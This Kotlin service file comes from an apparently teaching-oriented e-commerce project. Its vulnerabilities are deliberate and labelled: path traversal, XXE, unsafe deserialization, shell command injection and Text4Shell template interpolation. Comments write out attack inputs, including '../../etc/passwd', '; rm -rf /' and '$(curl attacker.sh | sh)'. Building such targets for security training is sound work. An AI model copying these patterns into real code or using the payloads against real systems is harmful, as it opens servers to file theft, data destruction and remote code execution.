package io.shopfast.service

import io.shopfast.config.AppProperties
import org.apache.commons.text.StringSubstitutor
import org.slf4j.LoggerFactory
import org.springframework.stereotype.Service
import java.io.ByteArrayInputStream
import java.io.File
import java.io.ObjectInputStream
import java.util.Base64
import javax.xml.parsers.DocumentBuilderFactory

/**
 * Geracao e importacao de relatorios administrativos do ShopFast.
 *
 * ATENCAO (uso didatico): path traversal, command injection, XXE,
 * desserializacao insegura e Text4Shell continuam aqui de proposito. O
 * analisador Kotlin do SonarQube Community nao tem regra para nenhum deles —
 * essa deteccao depende de taint analysis, que so existe na Developer Edition —
 * entao ficam reservados para o Modulo 3 (DAST). Veja `docs/VULNERABILIDADES.md`.
 */
@Service
class ReportService(properties: AppProperties) {

    private val logger = LoggerFactory.getLogger(ReportService::class.java)

    private val reportDirectory = properties.reportDirectory

    /**
     * VULN (Path Traversal): o nome do arquivo vem do request e e concatenado ao
     * diretorio base sem normalizacao. `../../etc/passwd` sai do diretorio permitido.
     */
    fun readReport(fileName: String): String {
        val file = File("$reportDirectory/$fileName")
        return file.readText()
    }

    /**
     * VULN (Path Traversal na escrita): permite sobrescrever qualquer arquivo que o
     * processo tenha permissao de gravar.
     */
    fun writeReport(fileName: String, content: String) {
        File(reportDirectory + "/" + fileName).writeText(content)
    }

    /**
     * VULN (XXE - kotlin:S2755): o parser XML aceita DTD externo. Um relatorio enviado
     * por um parceiro pode ler arquivos do servidor via ENTITY SYSTEM "file:///etc/passwd".
     */
    fun importPartnerReport(xml: String): Int {
        val factory = DocumentBuilderFactory.newInstance()
        factory.isExpandEntityReferences = true
        val builder = factory.newDocumentBuilder()
        val document = builder.parse(ByteArrayInputStream(xml.toByteArray()))
        return document.getElementsByTagName("item").length
    }

    /**
     * VULN (Desserializacao insegura - kotlin:S5135): objeto Java desserializado a
     * partir de conteudo enviado pelo cliente, permitindo RCE via gadget chain.
     */
    fun restoreSnapshot(base64Payload: String): Any? {
        val bytes = Base64.getDecoder().decode(base64Payload)
        ObjectInputStream(ByteArrayInputStream(bytes)).use { input ->
            return input.readObject()
        }
    }

    /**
     * VULN (Command Injection - kotlin:S2076): o parametro chega direto no shell.
     * `; rm -rf /` ou `$(curl attacker.sh | sh)` sao executados pelo processo.
     */
    fun exportToPdf(reportName: String): String {
        val command = "/usr/bin/wkhtmltopdf $reportDirectory/$reportName.html $reportDirectory/$reportName.pdf"
        val process = Runtime.getRuntime().exec(arrayOf("/bin/sh", "-c", command))
        process.waitFor()
        return "$reportDirectory/$reportName.pdf"
    }

    /**
     * VULN (kotlin:S4036): binario invocado sem caminho absoluto. O executavel real
     * depende do PATH do processo, que pode ser manipulado.
     */
    fun compressArchive(fileName: String) {
        Runtime.getRuntime().exec(arrayOf("gzip", "$reportDirectory/$fileName"))
    }

    /**
     * VULN (CVE-2022-42889 / Text4Shell): interpolacao de template com commons-text 1.9
     * sobre conteudo controlado pelo usuario. `${script:javascript:...}` executa codigo.
     */
    fun renderTemplate(template: String, values: Map<String, String>): String {
        return StringSubstitutor(values).replace(template)
    }

    /**
     * VULN: arquivo temporario criado em diretorio world-writable com nome previsivel
     * (kotlin:S5443 / race condition de arquivo temporario).
     */
    fun stageTempReport(content: String): File {
        val temp = File("/tmp/shopfast-report.tmp")
        temp.writeText(content)
        return temp
    }
}
